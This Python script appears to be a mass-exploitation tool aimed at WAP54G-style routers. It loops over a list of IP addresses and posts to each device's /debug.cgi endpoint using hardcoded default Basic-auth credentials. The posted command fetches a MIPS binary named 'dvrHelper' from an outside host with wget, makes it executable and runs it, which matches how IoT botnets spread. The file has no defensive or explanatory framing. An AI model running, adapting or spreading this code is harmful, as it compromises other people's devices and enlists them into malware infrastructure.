from multiprocessing import Process,Pool
import threading
import sys
import re
PROCESS_COUNT = 100
THREAD_COUNT = 1

def httpRequest(URL,HEADER,BODY,TIMEOUT):
	if not BODY:
		try:
			res = requests.get(URL, headers=HEADER, verify=False, timeout=TIMEOUT)
		except Exception as e:
		#print 'timeout'
			return 0,'TIMEOUT'
		else:
			if res.status_code :
				return res.status_code,res.content
			else:
				return 0,'PAGE NOT FOUND'
	else:
		try:
			res = requests.post(URL, data=BODY, headers=HEADER, verify=False, timeout=TIMEOUT)
		except Exception as e:
		#print 'timeout'
			return 0,'TIMEOUT'
		else:
			if res.status_code :
				return res.status_code,res.content
			else:
				return 0,'PAGE NOT FOUND'

def executeCommand(ip):
	Command = '/usr/bin/wget -O /tmp/dvrHelper http://88b.me/dlk/upg/bf.mipsel && chmod +x /tmp/dvrHelper && cd /tmp && ./dvrHelper WAP54G'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0","Authorization": "Basic R2VtdGVrOmdlbXRla3N3ZA=="}
	params={"data1": Command,"command": "ui_debug"}
	a,b = httpRequest(ip+"/debug.cgi",headers,params,30)
	result = re.findall(r"<textarea rows=30 cols=100>((\S|\s)*)?</textarea>",b)
	if str(result)!='None' and result!=[]:
		return result[0][0]
	return result

def wf(filename,data):
	f = open(filename,"ab")
	f.write(data+'\r\n')
	f.close

def rf(filename):
	fp=open(filename,"rb")
	data=fp.read()
	fp.close()
	return data


def one_process(Host):
	t_obj = []
	for i in range(THREAD_COUNT):
		t = threading.Thread(target=executeCommand, args=(Host,))
		t_obj.append(t)
		t.start()
	for tmp in t_obj:
		tmp.join()
 
if __name__ == "__main__":
	pool = Pool(PROCESS_COUNT)
	ip_list = rf('16WAP54G.txt').split('\n')
	for i in range(len(ip_list)):
		executeCommand(ip_list[i])
	
	
	# for i in range(len(ip_list)):
		# pool.apply_async(func=one_process, args=(ip_list[i],))
	# pool.close()
	# pool.join()
	# print 'end'
		